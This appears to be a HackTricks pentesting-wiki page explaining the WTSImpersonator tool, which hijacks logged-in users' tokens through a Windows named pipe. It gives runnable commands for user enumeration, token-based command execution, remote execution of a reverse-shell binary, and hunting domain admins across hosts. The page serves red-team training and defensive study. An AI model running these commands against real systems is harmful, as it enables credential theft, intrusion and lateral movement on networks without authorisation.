
<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

The **WTS Impersonator** tool exploits the **"\\pipe\LSM_API_service"** RPC Named pipe to stealthily enumerate logged-in users and hijack their tokens, bypassing traditional Token Impersonation techniques. This approach facilitates seamless lateral movements within networks. The innovation behind this technique is credited to **Omri Baso, whose work is accessible on [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Core Functionality
The tool operates through a sequence of API calls:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```

### Key Modules and Usage
- **Enumerating Users**: Local and remote user enumeration is possible with the tool, using commands for either scenario:
  - Locally:
    ```powershell
    .\WTSImpersonator.exe -m enum
    ```
  - Remotely, by specifying an IP address or hostname:
    ```powershell  
    .\WTSImpersonator.exe -m enum -s 192.168.40.131  
    ```

- **Executing Commands**: The `exec` and `exec-remote` modules require a **Service** context to function. Local execution simply needs the WTSImpersonator executable and a command:
  - Example for local command execution:
    ```powershell
    .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe  
    ```
  - PsExec64.exe can be used to gain a service context:
    ```powershell
    .\PsExec64.exe -accepteula -s cmd.exe
    ```

- **Remote Command Execution**: Involves creating and installing a service remotely similar to PsExec.exe, allowing execution with appropriate permissions.
  - Example of remote execution:
    ```powershell
    .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
    ```

- **User Hunting Module**: Targets specific users across multiple machines, executing code under their credentials. This is especially useful for targeting Domain Admins with local admin rights on several systems.
  - Usage example:
    ```powershell
    .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe 
    ```


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>